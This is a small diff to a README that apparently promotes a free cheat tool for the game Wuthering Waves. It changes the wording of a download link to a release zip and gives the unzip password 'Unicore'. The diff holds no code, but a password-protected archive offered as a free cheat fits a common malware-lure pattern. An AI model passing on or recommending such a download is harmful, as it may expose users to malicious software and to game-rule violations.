@@ -20,7 +20,7 @@ Unicore is the **ultimate external tool** for Wuthering Waves, offering state-of
 
 ## 📥 **Download**
 <div align="center">
-    <h2><a href="https://github.com/Lonansondra/Wuthering-Waves-Unicore-free-cheat/releases/download/latest/Unicore.zip">🔹 Download the Latest Release 🔹</a></h2>
+    <h2><a href="https://github.com/Lonansondra/Wuthering-Waves-Unicore-free-cheat/releases/download/latest/Unicore.zip">🔹 Download the Latest Release from Github🔹</a></h2>
 </div>
 
 💼 **Password to Unzip:** `Unicore`
